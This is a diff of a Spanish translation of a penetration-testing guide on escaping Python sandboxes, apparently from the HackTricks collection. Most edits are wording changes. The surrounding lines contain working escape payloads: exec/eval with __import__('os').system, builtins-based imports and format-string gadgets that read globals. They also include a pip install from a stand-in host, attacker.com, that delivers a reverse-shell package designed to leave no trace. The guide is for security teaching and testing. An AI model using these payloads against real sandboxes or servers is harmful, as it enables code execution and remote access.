@@ -39,16 +39,15 @@ open('/var/www/html/input', 'w').write('123')
 execfile('/usr/lib/python2.7/os.py')
 system('ls')
 ```
-Recuerda que las funciones _**open**_ y _**read**_ pueden ser útiles para **leer archivos** dentro del sandbox de python y para **escribir algún código** que podrías **ejecutar** para **eludir** el sandbox.
+Recuerda que las funciones _**open**_ y _**read**_ pueden ser útiles para **leer archivos** dentro de la sandbox de python y para **escribir algún código** que podrías **ejecutar** para **eludir** la sandbox.
 
-> [!CAUTION]
-> La función **input()** de Python2 permite ejecutar código python antes de que el programa se bloquee.
+> [!CAUTION] > La función **input()** de **Python2** permite ejecutar código python antes de que el programa se bloquee.
 
 Python intenta **cargar bibliotecas del directorio actual primero** (el siguiente comando imprimirá desde dónde está cargando módulos python): `python3 -c 'import sys; print(sys.path)'`
 
 ![](<../../../images/image (559).png>)
 
-## Eludir el sandbox de pickle con los paquetes de python instalados por defecto
+## Eludir la sandbox de pickle con los paquetes de python instalados por defecto
 
 ### Paquetes por defecto
 
@@ -80,7 +79,9 @@ pip.main(["install", "http://attacker.com/Rerverse.tar.gz"])
 ```
 Puedes descargar el paquete para crear el reverse shell aquí. Por favor, ten en cuenta que antes de usarlo debes **descomprimirlo, cambiar el `setup.py` y poner tu IP para el reverse shell**:
 
-{% file src="../../../images/Reverse.tar (1).gz" %}
+{{#file}}
+Reverse.tar (1).gz
+{{#endfile}}
 
 > [!NOTE]
 > Este paquete se llama `Reverse`. Sin embargo, fue diseñado especialmente para que cuando salgas del reverse shell el resto de la instalación falle, así que **no dejarás ningún paquete de python extra instalado en el servidor** cuando te vayas.
@@ -88,9 +89,9 @@ Puedes descargar el paquete para crear el reverse shell aquí. Por favor, ten en
 ## Eval-ing python code
 
 > [!WARNING]
-> Ten en cuenta que exec permite cadenas de varias líneas y ";", pero eval no (ver operador walrus)
+> Ten en cuenta que exec permite cadenas de múltiples líneas y ";", pero eval no (ver operador walrus)
 
-Si ciertos caracteres están prohibidos, puedes usar la representación **hex/octal/B64** para **bypassear** la restricción:
+Si ciertos caracteres están prohibidos, puedes usar la representación **hex/octal/B64** para **bypassar** la restricción:
 ```python
 exec("print('RCE'); __import__('os').system('ls')") #Using ";"
 exec("print('RCE')\n__import__('os').system('ls')") #Using "\n"
@@ -306,15 +307,15 @@ pass
 - [**Funciones integradas de python2**](https://docs.python.org/2/library/functions.html)
 - [**Funciones integradas de python3**](https://docs.python.org/3/library/functions.html)
 
-Si puedes acceder al objeto **`__builtins__`**, puedes importar bibliotecas (ten en cuenta que también podrías usar aquí otra representación de cadena mostrada en la última sección):
+Si puedes acceder al objeto **`__builtins__`** puedes importar bibliotecas (ten en cuenta que también podrías usar aquí otra representación de cadena mostrada en la última sección):
 ```python
 __builtins__.__import__("os").system("ls")
 __builtins__.__dict__['__import__']("os").system("ls")
 ```
 ### No Builtins
 
-Cuando no tienes `__builtins__` no podrás importar nada ni siquiera leer o escribir archivos ya que **todas las funciones globales** (como `open`, `import`, `print`...) **no están cargadas**.\
-Sin embargo, **por defecto, python importa muchos módulos en memoria**. Estos módulos pueden parecer benignos, pero algunos de ellos **también importan funcionalidades peligrosas** dentro de ellos que pueden ser accedidas para obtener incluso **ejecución arbitraria de código**.
+Cuando no tienes `__builtins__`, no podrás importar nada ni siquiera leer o escribir archivos ya que **todas las funciones globales** (como `open`, `import`, `print`...) **no están cargadas**.\
+Sin embargo, **por defecto, python importa muchos módulos en memoria**. Estos módulos pueden parecer benignos, pero algunos de ellos **también importan funcionalidades peligrosas** dentro de ellos que pueden ser accedidas para obtener incluso **ejecución de código arbitrario**.
 
 En los siguientes ejemplos puedes observar cómo **abusar** de algunos de estos módulos "**benignos**" cargados para **acceder** a **funcionalidades** **peligrosas** dentro de ellos.
 
@@ -376,7 +377,7 @@ __builtins__["__import__"]("os").system("ls")
 ```
 ## Globals y locales
 
-Comprobar los **`globals`** y **`locals`** es una buena manera de saber a qué puedes acceder.
+Verificar los **`globals`** y **`locals`** es una buena manera de saber a qué puedes acceder.
 ```python
 >>> globals()
 {'__name__': '__main__', '__doc__': None, '__package__': None, '__loader__': <class '_frozen_importlib.BuiltinImporter'>, '__spec__': None, '__annotations__': {}, '__builtins__': <module 'builtins' (built-in)>, 'attr': <module 'attr' from '/usr/local/lib/python3.9/site-packages/attr.py'>, 'a': <class 'importlib.abc.Finder'>, 'b': <class 'importlib.abc.MetaPathFinder'>, 'c': <class 'str'>, '__warningregistry__': {'version': 0, ('MetaPathFinder.find_module() is deprecated since Python 3.4 in favor of MetaPathFinder.find_spec() (available since 3.4)', <class 'DeprecationWarning'>, 1): True}, 'z': <class 'str'>}
@@ -681,7 +682,7 @@ people = PeopleInfo('GEEKS', 'FORGEEKS')
 st = "{people_obj.__init__.__globals__[CONFIG][KEY]}"
 get_name_for_avatar(st, people_obj = people)
 ```
-Nota cómo puedes **acceder a atributos** de manera normal con un **punto** como `people_obj.__init__` y **elemento de dict** con **paréntesis** sin comillas `__globals__[CONFIG]`
+Nota cómo puedes **acceder a atributos** de manera normal con un **punto** como `people_obj.__init__` y **elementos de diccionario** con **paréntesis** sin comillas `__globals__[CONFIG]`
 
 También nota que puedes usar `.__dict__` para enumerar elementos de un objeto `get_name_for_avatar("{people_obj.__init__.__globals__[os].__dict__}", people_obj = people)`
 
@@ -701,7 +702,7 @@ return 'HAL 9000'
 '{:open-the-pod-bay-doors}'.format(HAL9000())
 #I'm afraid I can't do that.
 ```
-**Más ejemplos** sobre **ejemplos de** **cadenas de formato** se pueden encontrar en [**https://pyformat.info/**](https://pyformat.info)
+**Más ejemplos** sobre **format** **string** se pueden encontrar en [**https://pyformat.info/**](https://pyformat.info)
 
 > [!CAUTION]
 > Consulta también la siguiente página para gadgets que **leerán información sensible de los objetos internos de Python**:
@@ -734,7 +735,7 @@ Desde [aquí](https://www.cyberark.com/resources/threat-research-blog/anatomy-of
 
 Según el [**desafío TypeMonkey de este informe**](https://corgi.rip/posts/buckeye-writeups/), es posible cargar bibliotecas arbitrarias desde el disco abusando de la vulnerabilidad de cadena de formato en python.
 
-Como recordatorio, cada vez que se realiza una acción en python, se ejecuta alguna función. Por ejemplo, `2*3` ejecutará **`(2).mul(3)`** o **`{'a':'b'}['a']`** será **`{'a':'b'}.__getitem__('a')`**.
+Como recordatorio, cada vez que se realiza una acción en python se ejecuta alguna función. Por ejemplo, `2*3` ejecutará **`(2).mul(3)`** o **`{'a':'b'}['a']`** será **`{'a':'b'}.__getitem__('a')`**.
 
 Tienes más como esto en la sección [**Ejecución de Python sin llamadas**](#python-execution-without-calls).
 
@@ -823,7 +824,7 @@ compile("print(5)", "", "single")
 dir(get_flag.__code__)
 ['__class__', '__cmp__', '__delattr__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__gt__', '__hash__', '__init__', '__le__', '__lt__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', 'co_argcount', 'co_cellvars', 'co_code', 'co_consts', 'co_filename', 'co_firstlineno', 'co_flags', 'co_freevars', 'co_lnotab', 'co_name', 'co_names', 'co_nlocals', 'co_stacksize', 'co_varnames']
 ```
-### Obteniendo Información del Código
+### Obtener información del código
 ```python
 # Another example
 s = '''
@@ -897,7 +898,7 @@ dis.dis(get_flag)
 44 LOAD_CONST               0 (None)
 47 RETURN_VALUE
 ```
-Nota que **si no puedes importar `dis` en el sandbox de python** puedes obtener el **bytecode** de la función (`get_flag.func_code.co_code`) y **desensamblarlo** localmente. No verás el contenido de las variables que se están cargando (`LOAD_CONST`), pero puedes inferirlas de (`get_flag.func_code.co_consts`) porque `LOAD_CONST` también indica el desplazamiento de la variable que se está cargando.
+Nota que **si no puedes importar `dis` en la sandbox de python** puedes obtener el **bytecode** de la función (`get_flag.func_code.co_code`) y **desensamblarlo** localmente. No verás el contenido de las variables que se están cargando (`LOAD_CONST`), pero puedes inferirlas de (`get_flag.func_code.co_consts`) porque `LOAD_CONST` también indica el desplazamiento de la variable que se está cargando.
 ```python
 dis.dis('d\x01\x00}\x01\x00d\x02\x00}\x02\x00d\x03\x00d\x04\x00g\x02\x00}\x03\x00|\x00\x00|\x02\x00k\x02\x00r(\x00d\x05\x00Sd\x06\x00Sd\x00\x00S')
 0 LOAD_CONST          1 (1)
@@ -1053,6 +1054,5 @@ será eludido
 - [https://gynvael.coldwind.pl/n/python_sandbox_escape](https://gynvael.coldwind.pl/n/python_sandbox_escape)
 - [https://nedbatchelder.com/blog/201206/eval_really_is_dangerous.html](https://nedbatchelder.com/blog/201206/eval_really_is_dangerous.html)
 - [https://infosecwriteups.com/how-assertions-can-get-you-hacked-da22c84fb8f6](https://infosecwriteups.com/how-assertions-can-get-you-hacked-da22c84fb8f6)
-
 
 {{#include ../../../banners/hacktricks-training.md}}
